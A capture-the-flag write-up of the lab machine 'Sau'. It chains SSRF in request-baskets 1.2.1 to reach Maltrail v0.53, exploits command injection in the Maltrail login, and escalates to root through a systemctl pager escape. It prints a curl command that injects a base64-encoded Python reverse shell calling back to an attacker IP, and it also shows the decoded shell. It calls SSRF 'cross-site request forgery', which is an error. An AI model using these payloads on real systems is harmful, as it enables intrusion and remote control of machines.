
# Box: Sau

> damiano gubiani | 19/11/2025

export box ip

```bash
export IP='10.10.11.224'
```

# Enumerating

running nmap on the target to check for open ports

command:

```bash
sudo nmap -sS -sC -sV -oN nmap/scan -T4 -vv $IP
```

output:

```
Nmap scan report for 10.10.11.224
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2025-11-26 05:34:45 EST for 14s
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
55555/tcp open     unknown syn-ack ttl 63

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:34
Completed NSE at 05:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:34
Completed NSE at 05:34, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds
           Raw packets sent: 1115 (49.036KB) | Rcvd: 1109 (44.356KB)
```

seems we have a web page on port 55555 and the http port is filtered-out

lets check the web page on port 55555

# WebApp

## Enumerating

![](screen/Pasted%20image%2020251126114027.png)

checking the wep app we di scover the fact that is powered by request-baskets version 1.2.1

lets see if theres any public exploit for this version of the app

## Exploit

the webapp is vulnerable to SSFR ( cross-site request forgery)

> https://nvd.nist.gov/vuln/detail/CVE-2023-27163

```
_The API endpoints /api/baskets/{name}, /baskets/{name} are vulnerable to unauthenticated Server-Side Request Forgery (SSRF) attacks via the forward_url parameter._
```

so we first create a basket , and change the options of it

![](screen/Pasted%20image%2020251126114602.png)

we know the port 80 is filtered so we are gonna proxy our request to that port

lets run a wget to extract the web page index on port 80

command:

```bash
wget http://10.10.11.224:55555/fusaiir
```

after that we open the downloaded file with firefox 

![](Sau/screen/Pasted%20image%2020251126114927.png)

we see that the page is running maltrail v0.53 lets on the internet for a public exploit to utilize on the application

![](screen/Pasted%20image%2020251126120110.png)

i found this PoC that we can use to gain a reverse shell on the machine 

we are gonna encode our exploit and decode it on the victim to start a reverse shell

i created a custom exploit script to make this easier

script:

```bash
#! /bin/bash

curl -X POST 'http://10.10.11.224:55555/fusaiir/login'\
        --data 'username=;`echo+cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjUiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc=|base64+-d|bash`'
```

the base64 data is just this payload encoded:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

i started a listener and after running the script i got a connection

![](screen/Pasted%20image%2020251126121159.png)

after retrieving the home flag i started doing standard enumeration , starting of sudo privilage and i found this:

```
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

we can check the trail service status as root user , lets check the version of the systemctl for potential public exploit

```
systemd 245 (245.4-4ubuntu3.22)
```

i found online that this version of systemctl we can start a shell inside of it using the !sh command

> https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7

in fact after running the exploit we got a root shell

![](screen/Pasted%20image%2020251126121919.png)
